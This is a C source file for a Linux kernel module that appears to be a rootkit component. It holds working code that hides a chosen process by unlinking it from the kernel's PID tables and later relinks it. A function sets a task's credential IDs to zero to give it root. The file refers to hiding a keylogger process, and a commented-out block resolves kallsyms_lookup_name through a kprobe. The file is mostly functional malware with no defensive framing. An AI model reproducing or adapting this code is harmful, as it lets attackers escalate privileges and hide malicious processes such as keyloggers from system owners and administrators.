#include "include/task.h"

extern unsigned long sym2addr(const char *name);

int lkm_task_init(void); 
int lkm_task_exit(void); 
int lkm_task_root(struct task_struct *t); 
int lkm_task_hide(struct lkm_hide_struct *ts); 
int lkm_task_unhide(struct lkm_hide_struct *ts); 

static void (*lkm_attach_pid)(struct task_struct *task, enum pid_type) = NULL;
struct lkm_hide_struct lkm_hide_keylog = {.task = NULL, .hide = false};
/*
//////////////////////// DEBUG //////////////////////////////////////////////////////////
static unsigned long (*find_sym)(const char *name) = NULL;	//Will be "kallsyms_lookup_name()"
static void lkm_print_cred(struct task_struct *t); 
void lkm_print_task(struct task_struct *t);

static int lkm_task_list(void) {

	struct task_struct *t;
	for_each_process(t) {
		printk(KERN_INFO "------------------------------\n");
		lkm_print_task(t);
		printk(KERN_INFO "______________________________\n");
		if(!strcmp(t->comm, "tttt")) {
			printk(KERN_INFO "!!!!find MY task\n");
			struct lkm_hide_struct ts;
			ts.task = t;
			ts.hide = false;
			lkm_task_hide(&ts);
			lkm_task_unhide(&ts);
			break;
		}
		if(t->pid == 534366) {

			lkm_print_cred(t);
			break;
		}
	}
	return 0;
}
void lkm_print_task(struct task_struct *t) {
	if(!t) return;

	printk(KERN_INFO "TASK: pid=%d||name(%s)\n", t->pid, t->comm);
	return;
}
static unsigned long sym2addr(const char *name) {
	if(!find_sym) {
		struct kprobe kp = {
			.symbol_name = "kallsyms_lookup_name",
		};

		if(register_kprobe(&kp) < 0) return 0;
		find_sym = (unsigned long(*)(const char *name))kp.addr;
		unregister_kprobe(&kp);
	}

	return find_sym(name);
}
/////////////////////////////////////////////////////////////////////////////////////////
*/
int lkm_task_hide(struct lkm_hide_struct *ts) {
	if(ts->hide || !ts->task) return -1;
	
	//printk(KERN_INFO "Hide...\n");
	struct hlist_node *link;
	struct task_struct *t = ts->task;

	link = &t->pid_links[PIDTYPE_PID];
	hlist_del(link);
	ts->hide = true;
	return 0;
}
int lkm_task_unhide(struct lkm_hide_struct *ts) {
	if(!lkm_attach_pid) return -2; 
	if(!ts->hide || !ts->task) return -1;

	//printk(KERN_INFO "Unhide...\n");
	struct task_struct *t = ts->task;

	lkm_attach_pid(t, PIDTYPE_PID);
	ts->hide = false;
	return 0;
}
int lkm_task_root(struct task_struct *t) {
	if(!t) return -1;
        struct cred *cr = (struct cred*)t->cred;

	cr->uid.val = cr->gid.val = 0;
	cr->euid.val = cr->egid.val = 0;
	cr->suid.val = cr->sgid.val = 0;
	cr->fsuid.val = cr->fsgid.val = 0;
	return 0;
}

int lkm_task_init(void) {
	printk(KERN_INFO "++++++ LKM_TASK, ale-alE-aLE-OP ++++++\n");

	lkm_attach_pid = (void(*))sym2addr("attach_pid");
	if(!lkm_attach_pid) return -1; 
	return 0;
}
int lkm_task_exit(void) {

	printk(KERN_INFO "++++++ LKM_TASK, HN-Hn-hn ++++++\n");
	return 0;
}
